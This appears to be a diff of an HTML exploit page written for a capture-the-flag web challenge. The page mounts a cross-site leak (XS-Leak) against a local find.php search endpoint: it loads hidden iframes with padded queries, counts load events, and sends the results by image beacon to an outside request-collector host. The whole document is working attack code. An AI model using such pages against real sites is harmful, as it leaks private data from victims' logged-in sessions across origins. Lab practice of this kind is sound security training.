@@ -1,13 +1,16 @@
 <!doctype html><meta charset="utf-8"><script>
-const T="http://localhost",C="https://fbcovsq.request.dreamhack.games";
+const T="http://localhost",C="https://vxvbhzy.request.dreamhack.games";
 const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
 const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
-function P(u,s=1200){return new Promise(r=>{const w=open("about:blank","p","w=150,h=150");
-setTimeout(()=>{try{w.location=u}catch(e){}},50);
-setTimeout(()=>{let res={};
-try{res.origin=w.origin}catch(e){res.origin="E:"+e.name}
-try{res.closed=w.closed}catch(e){res.closed="E:"+e.name}
-try{res.hlen=w.history.length}catch(e){res.hlen="E:"+e.name}
-try{w.location="about:blank"}catch(e){}setTimeout(()=>{try{w.close()}catch(e){}},150);r(res)},s)})}
-(async()=>{for(const pad of [100,1900,2100]){L("c",{pad,...await P(F("zzz",pad))});await new Promise(r=>setTimeout(r,300))}L("done",{})})();
+function P(u,s=2000){return new Promise(r=>{
+  const f=document.createElement("iframe");f.style.display="none";
+  let n=0;f.onload=()=>{n++};
+  f.src=u;document.body.appendChild(f);
+  setTimeout(()=>{f.remove();r(n)},s);
+});}
+(async()=>{
+  document.body||document.write("<body>");
+  for(const pad of [100,3000]){L("c",{pad,onloads:await P(F("zzz",pad))});await new Promise(r=>setTimeout(r,400))}
+  L("done",{});
+})();
 </script>
